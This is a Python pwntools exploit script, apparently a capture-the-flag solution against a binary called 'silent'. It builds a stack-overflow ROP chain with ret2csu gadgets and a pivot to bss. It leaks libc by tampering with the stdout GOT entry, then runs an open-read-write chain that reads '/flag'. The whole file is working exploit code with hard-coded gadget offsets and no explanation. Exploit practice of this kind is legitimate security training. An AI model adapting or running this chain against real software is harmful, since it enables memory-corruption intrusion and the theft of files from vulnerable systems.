#!/usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './silent'
context.os = 'linux'
context.arch = 'amd64'
context.timeout = 5
context.log_level = 'debug'

debug = 1
if debug:
    io = process('./silent')
else:
    io = remote('0.0.0.0',10086)

elf = ELF('./silent')
libc = ELF('./libc-2.27.so')
one_gadgets = [0x4f2a5, 0x4f302, 0x10a2fc]

def p():
    gdb.attach(proc.pidof(io)[0])

leak = lambda name, address: log.success("{} --> {}".format(name, hex(address)))


magic = 0x00000000004007e8 # add    DWORD PTR [rbp-0x3d],ebx; nop    DWORD PTR [rax+rax*1+0x0]; repz ret
csu1 = 0x40095a # pop rbx, rbp, 12,13,14,15
csu2 = 0x400940 # edi=r13d, rsi=r14, rdx=r15, call [r12 + 8*rbx]
fake_rbp = 0x601040 + 0x40
prep_call_read_addr = 0x4008dc
pop_rbp = 0x0000000000400788 # pop rbp ; ret
leave_ret = 0x4008fc
offset_write_stdout = 0xffffffffffd23990

padding = b'a' * 0x40
payload = padding + flat(
    fake_rbp, csu1, 0, 1, elf.got['read'], 0, fake_rbp+8,0x200,
    csu2, 0, 0, fake_rbp, 0, 0, 0, 0,
    leave_ret
)
#p()
io.send(payload)

pause()
log.info("sending payload to bss")
payload = flat(
      csu1, offset_write_stdout, elf.got['stdout']+0x3d, 0, 0, 0, 0, magic,
      csu1, 0, 1, elf.got['stdout'], 1, elf.got['read'], 0x8,
      csu2, 0, 0, fake_rbp, 0, 0, 0, 0,
      prep_call_read_addr
)
#p()
io.send(payload)

#leak
libc.address = u64(io.recvuntil(b'\x7f')[-6:] + b'\x00\x00') - libc.symbols['read']
leak("libc.address", libc.address)
pause()

# orw
flag_strings_addr = 0x601040
flag_addr = 0x601040 +0x200
pop_rdi_ret = 0x0000000000400963 # pop rdi ; ret
pop_rsi_ret = libc.address + 0x0000000000023a6a # pop rsi ; ret
pop_rdx_ret = libc.address + 0x0000000000001b96 # pop rdx ; ret
log.info("sending orw payload")
payload3 = flat(
    {
        0:"/flag" ,#0x601040
        0x48:[
                pop_rdi_ret , flag_strings_addr , pop_rsi_ret , 0 , libc.symbols['open'],
                pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_ret , 0x100 , libc.symbols['read'],
                pop_rdi_ret , 1 , pop_rsi_ret , flag_addr , pop_rdx_ret , 0x100 , libc.symbols['write'],
             ]
    },filler=b'\x00'
)

io.send(payload3)
io.interactive()
